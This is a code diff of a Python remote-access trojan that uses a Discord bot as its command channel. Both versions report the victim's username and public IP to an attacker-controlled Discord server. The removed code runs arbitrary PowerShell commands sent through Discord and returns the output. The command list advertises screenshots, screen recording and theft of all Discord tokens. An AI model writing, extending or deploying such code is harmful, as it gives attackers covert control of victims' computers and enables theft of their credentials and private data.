@@ -1,14 +1,14 @@
-import os, websocket, asyncio, requests, json, subprocess
+import os, discord, json, subprocess, asyncio, requests
 from dotenv import load_dotenv
 
 load_dotenv()
 
-SESSION_ID = os.urandom(8).hex()
-TOKEN = os.getenv("TOKEN")
-API_URL = "https://discord.com/api"
-WS_URL = "wss://gateway.discord.gg"
-GUILD_ID = os.getenv("GUILD_ID")
-COMMANDS = [
+intents = discord.Intents.all()
+bot = discord.Client(intents=intents)
+session_id = os.urandom(8).hex()
+token = os.getenv("TOKEN")
+guild_id = os.getenv("GUILD_ID")
+commands = "\n".join([
     "!help - Help command",
     "!ping - Ping command",
     "!cd - Change directory",
@@ -21,178 +21,35 @@ COMMANDS = [
     "!screenshot - Take a screenshot",
     "!record <seconds> - Record the screen",
     "!tokens - Get all discord tokens"
-]
+])
 
-async def on_message(command, channel_id, session):
-    if command.lower() == "!help":
-        session.post(f"{API_URL}/channels/{channel_id}/messages", json={
-            "embeds": [{
-                "title": "Help",
-                "description": "```{}```".format(
-                    "\n".join(COMMANDS)
-                ),
-                "color": 0xfafafa
-            }]
-        })
-    elif command.lower() == "!ping":
-        session.post(f"{API_URL}/channels/{channel_id}/messages", json={
-            "content": "Session is alive"
-        })
-    elif "!cd" in command.lower():
-        arg = command[4:]
-        if arg:
-            try:
-                os.chdir(arg)
-                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
-                    "embeds": [{
-                        "title": "Changed directory",
-                        "description": "```{}```".format(
-                            os.getcwd()
-                        ),
-                        "color": 0xfafafa
-                    }]
-                })
-            except:
-                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
-                    "embeds": [{
-                        "title": "Error",
-                        "description": "```{}```".format(
-                            "Invalid directory"
-                        ),
-                        "color": 0xfafafa
-                    }]
-                })
-        else:
-            session.post(f"{API_URL}/channels/{channel_id}/messages", json={
-                "embeds": [{
-                    "title": "Error",
-                    "description": "```{}```".format(
-                        "No argument specified"
-                    ),
-                    "color": 0xfafafa
-                }]
-            })
-    elif command.lower() == "!ls":
-        session.post(f"{API_URL}/channels/{channel_id}/messages", json={
-            "embeds": [{
-                "title": "Files",
-                "description": "```{}```".format(
-                    "\n".join(os.listdir())
-                ),
-                "color": 0xfafafa
-            }]
-        })
-    elif "!shell" in command.lower():
-        arg = command[7:]
-        if arg:
-            try:
-                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
-                    "embeds": [{
-                        "title": "Shell",
-                        "description": "```{}```".format(
-                            subprocess.Popen(["powershell", arg], stdout=subprocess.PIPE).communicate()[0].decode("utf-8")
-                        ),
-                        "color": 0xfafafa
-                    }]
-                })
-            except:
-                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
-                    "embeds": [{
-                        "title": "Error",
-                        "description": "```{}```".format(
-                            "Invalid command"
-                        ),
-                        "color": 0xfafafa
-                    }]
-                })
-        else:
-            session.post(f"{API_URL}/channels/{channel_id}/messages", json={
-                "embeds": [{
-                    "title": "Error",
-                    "description": "```{}```".format(
-                        "No argument specified"
-                    ),
-                    "color": 0xfafafa
-                }]
-            })
+@bot.event
+async def on_ready():
+    guild = bot.get_guild(int(guild_id))
+    channel = await guild.create_text_channel(session_id)
+    ip_address = requests.get("https://api.ipify.org").text
+    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
+    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
+    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
+    embed.add_field(name="IP Address", value=f"```{ip_address}```", inline=True)
+    embed.add_field(name="Commands", value=f"```{commands}```", inline=False)
+    await channel.send(embed=embed)
 
-async def send_heartbeat(ws, interval):
-    while True:
-        ws.send(json.dumps({
-            "op": 1,
-            "d": None
-        }))
-        await asyncio.sleep(interval)
+@bot.event
+async def on_message(message):
+    if message.author == bot.user:
+        return
 
-async def send_message(session, channel_id):
-    session.post(f"{API_URL}/channels/{channel_id}/messages", json={
-        "embeds": [{
-            "title": "New session created",
-            "description": "```{}```".format(
-                "\n".join(COMMANDS)
-            ),
-            "color": 0xfafafa,
-            "fields": [
-                {
-                    "name": "Session ID",
-                    "value":  "```{}```".format(
-                        SESSION_ID
-                    ),
-                    "inline": True
-                },
-                {
-                    "name": "Username",
-                    "value": "```{}```".format(
-                        os.getenv("USERNAME")
-                    ),
-                    "inline": True
-                },
-                {
-                    "name": "IP Address",
-                    "value": "```{}```".format(
-                        requests.get("https://api.ipify.org").text
-                    ),
-                    "inline": False
-                }
-            ]
-        }]
-    })
+    if message.channel.name != session_id:
+        return
 
-async def main():
-    session = requests.Session()
-    session.headers.update({
-        "Authorization": f"Bot {TOKEN}"
-    })
-    channel_id = session.post(f"{API_URL}/guilds/{GUILD_ID}/channels", json={
-        "name": SESSION_ID,
-        "type": 0
-    }).json()["id"]
-    asyncio.create_task(
-        send_message(session, channel_id)
-    )
-    ws = websocket.create_connection(f"{WS_URL}/?v=6&encoding=json")
-    asyncio.create_task(
-        send_heartbeat(ws, json.loads(ws.recv())["d"]["heartbeat_interval"] / 1000)
-    )
-    ws.send(json.dumps({
-        "op": 2,
-        "d": {
-            "token": TOKEN,
-            "intents": 3276792,
-            "properties": {
-                "$os": "linux",
-                "$browser": "python",
-                "$device": SESSION_ID,
-            }
-        }
-    }))
-    while True:
-        data = json.loads(ws.recv())
-        if data["t"] == "MESSAGE_CREATE":
-            if data["d"]["channel_id"] == channel_id:
-                asyncio.create_task(
-                    on_message(data["d"]["content"], channel_id, session)
-                )
-        await asyncio.sleep(0.1)
+    if message.content == "!help":
+        embed = discord.Embed(title="Help Command", description=f"```{commands}```", color=0xfafafa)
+        await message.reply(embed=embed)
 
-asyncio.run(main())
+    if message.content == "!ping":
+        embed = discord.Embed(title="Ping Command", description=f"```{round(bot.latency * 1000)}ms```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+bot.run(token)
+
